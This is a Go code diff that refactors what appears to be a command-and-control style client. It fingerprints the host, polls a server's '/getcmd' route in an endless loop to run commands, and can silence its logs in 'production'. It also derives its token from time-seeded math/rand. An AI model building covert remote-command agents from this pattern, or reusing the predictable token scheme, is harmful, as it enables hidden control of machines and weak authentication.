@@ -15,6 +15,20 @@ import (
 
 //go:generate go-bindata -o cert.go ../cert/server.crt
 
+type Client struct {
+	Cfg     *ClientConfig
+	HTTP    *http.Client
+	BaseURL string // Gets defined in RequestCommand() - requests.go
+	Token   string
+}
+
+type ClientConfig struct {
+	Host    string
+	Port    int
+	HasTLS  bool // for debug only
+	HasLogs bool // disable this in "production"
+}
+
 // routes
 const (
 	getCmdURL       = "/getcmd"
@@ -27,14 +41,7 @@ const (
 // special errors
 var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")
 
-// debug
-var hasTLS = true
-
-const hasLogs = true
-
-var ClientToken string
-
-func ClientSetup() *http.Client {
+func (cfg *ClientConfig) ClientSetup() *Client {
 	// set up own cert pool
 	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
 	transport := &http.Transport{
@@ -44,7 +51,7 @@ func ClientSetup() *http.Client {
 			Timeout: 10 * time.Second,
 		}).Dial,
 	}
-	client := &http.Client{
+	httpClient := &http.Client{
 		Transport: transport,
 		Timeout:   30 * time.Minute, // The client tries to reconnect anyways...
 	}
@@ -59,24 +66,29 @@ func ClientSetup() *http.Client {
 		panic("Couldn't load cert file")
 	}
 
-	return client
+	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
+	token := strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)
+
+	return &Client{
+		Cfg:   cfg,
+		HTTP:  httpClient,
+		Token: token,
+	}
 }
 
-func RunClient(host string, port int) {
-	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
-	ClientToken = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)
+func RunClient(cfg *ClientConfig) {
 
-	if !hasLogs {
+	if !cfg.HasLogs {
 		log.SetFlags(0)
 		log.SetOutput(ioutil.Discard)
 	}
 
 	RunFingerprinter()
 
-	client := ClientSetup()
+	client := cfg.ClientSetup()
 
 	for {
-		cmd, hoststr := RequestCommand(client, host, port)
-		Middleware(client, cmd, hoststr)
+		cmd := client.RequestCommand()
+		client.Middleware(cmd)
 	}
 }
